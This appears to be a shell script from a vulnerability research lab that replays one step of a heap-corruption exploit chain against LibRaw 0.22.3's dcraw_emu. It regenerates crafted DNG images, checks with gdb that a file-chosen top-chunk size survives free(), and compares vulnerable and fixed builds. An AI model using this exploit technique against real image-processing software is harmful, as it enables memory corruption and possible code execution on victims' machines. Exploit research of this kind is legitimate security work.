#!/bin/sh
# One-command author-side replay of W29: a crafted image alone writes a
# glibc-plausible size into the live top chunk, so free() succeeds.
# Run from any cwd after bootstrap.sh (or via replay-frontier.sh):
#   sh lab/frontier/libraw2shell/w29/replay.sh
#
# The derived DNGs are gitignored and regenerated from committed specs before
# hashing. Only build-stable field words are asserted: c1=0x00c0, c2=c3=0,
# PREV_INUSE set (odd c0), sysmem=16781312 and normal exit. W29's low word
# varies with the rebuilt binary's heap layout and is deliberately not pinned.
set -u
ORIG=$(pwd)
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
ROOT=$(CDPATH= cd -- "$HERE/.." && pwd)
cd "$ROOT" || exit 2
pass=0
fail=0
ok() {
  label=$1
  shift
  if "$@"; then printf 'PASS %s\n' "$label"; pass=$((pass+1))
  else printf 'FAIL %s\n' "$label"; fail=$((fail+1)); fi
}

python3 craft_uncompressed_poc.py w11/targetbeef.input w29/red18.input \
  w29/specs/red18-g0-b0-wl65535.json >/dev/null || exit 2
python3 craft_uncompressed_poc.py w11/targetbeef.input w29/red11.input \
  w29/specs/red11-g0-b0-wl65535.json >/dev/null || exit 2
ok 'hashes of pins, specs, probe and derived inputs' \
  sh -c 'sha256sum -c w29/hashes-clean.sha256 >w29/replay-hashes.out 2>&1'

cd w23 || exit 2
ok 'red18 gdb: file-chosen valid top size, PREV_INUSE, normal exit' \
  sh -c 'W23_INPUT=../w29/red18.input gdb -q -batch -x ../w29/sizefield-before.gdb ../o0/LibRaw-0.22.3/bin/dcraw_emu >../w29/replay-gdb-red18.txt 2>&1; grep -qE "W29 BEFORE sf=0x[0-9a-f]+ val=0x[0-9a-f]+ hw=[0-9a-f]*[13579bdf] 00c0 0000 0000 sysmem=16781312" ../w29/replay-gdb-red18.txt && grep -q "W29 CONTINUED" ../w29/replay-gdb-red18.txt && grep -q "exited normally" ../w29/replay-gdb-red18.txt && ! grep -q "SIGABRT" ../w29/replay-gdb-red18.txt'
cd "$ROOT" || exit 2

ok 'red18 plain vulnerable pad16 rc0, empty stderr' \
  sh -c 'env MALLOC_TOP_PAD_=16777216 plain/LibRaw-0.22.3/bin/dcraw_emu -n 1 w29/red18.input >/dev/null 2>w29/replay-plain-red18.err; [ $? = 0 ] && [ ! -s w29/replay-plain-red18.err ]'
ok 'red18 fixed pad16 rc0, empty stderr' \
  sh -c 'env MALLOC_TOP_PAD_=16777216 fixed/LibRaw-0.22.3/bin/dcraw_emu -n 1 w29/red18.input >/dev/null 2>w29/replay-fixed-red18.err; [ $? = 0 ] && [ ! -s w29/replay-fixed-red18.err ]'
ok 'red18 plain no-option pad16 rc0, empty stderr' \
  sh -c 'env MALLOC_TOP_PAD_=16777216 plain/LibRaw-0.22.3/bin/dcraw_emu w29/red18.input >/dev/null 2>w29/replay-none-red18.err; [ $? = 0 ] && [ ! -s w29/replay-none-red18.err ]'
ok 'red11 plain vulnerable pad16 rc134 corrupted-size-vs-prev-size' \
  sh -c 'env MALLOC_TOP_PAD_=16777216 plain/LibRaw-0.22.3/bin/dcraw_emu -n 1 w29/red11.input >/dev/null 2>w29/replay-plain-red11.err; [ $? = 134 ] && grep -q "corrupted size vs. prev_size" w29/replay-plain-red11.err'

printf 'PASS=%s FAIL=%s\n' "$pass" "$fail"
[ "$fail" = 0 ] && printf 'W29_OK\n'
cd "$ORIG" || exit 2
[ "$fail" = 0 ]
